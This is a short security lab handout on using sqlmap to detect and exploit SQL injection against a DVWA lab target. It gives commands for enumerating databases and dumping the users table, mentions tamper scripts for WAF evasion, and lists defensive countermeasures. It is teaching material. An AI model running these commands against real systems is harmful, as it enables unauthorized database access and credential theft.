# L17: Automated SQL Injection with sqlmap

## Purpose

sqlmap automates detection and exploitation of SQL injection vulnerabilities.

## Usage steps

```bash
# Test URL parameter
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxx"

# Enumerate databases
sqlmap -u <url> --dbs

# Dump table
sqlmap -u <url> -D dvwa -T users --dump

# POST request from file
sqlmap -r request.txt --batch

# Risk/level tuning
sqlmap -u <url> --level=3 --risk=2
```

## Safety

- Use `--batch` for non-interactive labs.
- Never run against production without written authorization.
- `--tamper` scripts for WAF evasion (awareness only).

## Countermeasures

- Same as L16: parameterized queries.
- Block sqlmap User-Agent signatures at WAF.
- Monitor for UNION/SELECT patterns in query strings.
- Deploy database activity monitoring (DAM).

---

*Lab reminder: test only on authorized systems. Unauthorized access violates the IT Act, 2000.*
